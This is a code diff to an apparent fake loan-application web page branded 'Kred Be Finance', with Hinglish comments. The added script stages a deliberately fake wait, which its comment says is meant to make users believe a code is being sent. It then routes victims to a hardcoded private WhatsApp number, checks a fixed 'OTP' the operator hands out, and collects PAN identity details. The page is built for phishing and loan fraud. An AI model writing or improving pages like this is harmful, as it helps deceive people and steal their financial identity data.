@@ -23,6 +23,7 @@
         #otp-section, #details-section { display: none; }
         .apply-btn { background-color: var(--brand-blue); color: var(--white); padding: 16px; border-radius: 12px; font-size: 1.1rem; font-weight: bold; width: 100%; border: none; cursor: pointer; margin-top: 10px; }
         footer { padding: 30px 20px; text-align: center; font-size: 0.8rem; color: #777; }
+        #status-msg { font-size: 0.75rem; margin-top: 5px; color: var(--brand-blue); font-weight: bold; display: none; }
     </style>
 </head>
 <body>
@@ -36,20 +37,21 @@
 
     <main>
         <div class="card">
-            <h2>Verify Mobile to Apply</h2>
+            <h2>Personal Loan Application</h2>
             
             <div class="form-group">
                 <label>Mobile Number</label>
                 <div class="input-wrapper">
                     <span class="prefix">+91</span>
                     <input type="tel" id="mobile" placeholder="Enter Mobile" maxlength="10">
-                    <button class="wa-btn" onclick="getCodeOnWA()">Get Code</button>
+                    <button class="wa-btn" id="main-btn" onclick="startVerification()">Get Code</button>
                 </div>
+                <p id="status-msg">Sending code request...</p>
             </div>
 
             <div id="otp-section">
                 <div class="form-group">
-                    <label>Enter 4-Digit Code from WhatsApp</label>
+                    <label>Enter 4-Digit Code received on WhatsApp</label>
                     <div class="input-wrapper">
                         <input type="tel" id="otp-input" placeholder="0000" maxlength="4" style="text-align: center; letter-spacing: 5px;">
                         <button class="wa-btn" style="background: #002e6e;" onclick="verifyManualOTP()">Verify</button>
@@ -73,5 +75,61 @@
         <p>© 2026 Kred Be Finance Pvt. Ltd.</p>
     </footer>
 
-    <script
-        
+    <script>
+        const myWhatsApp = "917850953644"; 
+        const secretCode = "7850"; 
+
+        function startVerification() {
+            const mobile = document.getElementById('mobile').value;
+            if(!/^[6-9]\d{9}$/.test(mobile)) { 
+                alert("Kripya sahi number dalein"); 
+                return; 
+            }
+
+            const btn = document.getElementById('main-btn');
+            const status = document.getElementById('status-msg');
+            
+            btn.disabled = true;
+            btn.innerText = "...";
+            status.style.display = "block";
+
+            // 2 second ka fake wait taaki user ko lage code ja raha hai
+            setTimeout(() => {
+                const msg = `Hello Kred Be, mera number ${mobile} verify kijiye aur mujhe application code bhejiye.`;
+                const waUrl = `https://wa.me/${myWhatsApp}?text=${encodeURIComponent(msg)}`;
+                
+                // WhatsApp kholna
+                window.location.href = waUrl;
+
+                // Wapas aane par OTP section dikhana
+                setTimeout(() => {
+                    document.getElementById('otp-section').style.display = 'block';
+                    status.innerText = "Check your WhatsApp for code";
+                    btn.innerText = "Sent";
+                }, 1000);
+
+            }, 2000);
+        }
+
+        function verifyManualOTP() {
+            const enteredCode = document.getElementById('otp-input').value;
+            if(enteredCode === secretCode) {
+                alert("Verification Successful!");
+                document.getElementById('otp-section').style.display = 'none';
+                document.getElementById('status-msg').style.display = 'none';
+                document.getElementById('mobile').disabled = true;
+                document.getElementById('details-section').style.display = 'block';
+            } else {
+                alert("Galat Code! Kripya WhatsApp wala code hi dalein.");
+            }
+        }
+
+        function finalApply() {
+            const pan = document.getElementById('pan-input').value;
+            if(!pan) { alert("PAN details bhariye"); return; }
+            alert("Processing Application...");
+            window.location.href = "fillyourdetail.html";
+        }
+    </script>
+</body>
+</html>
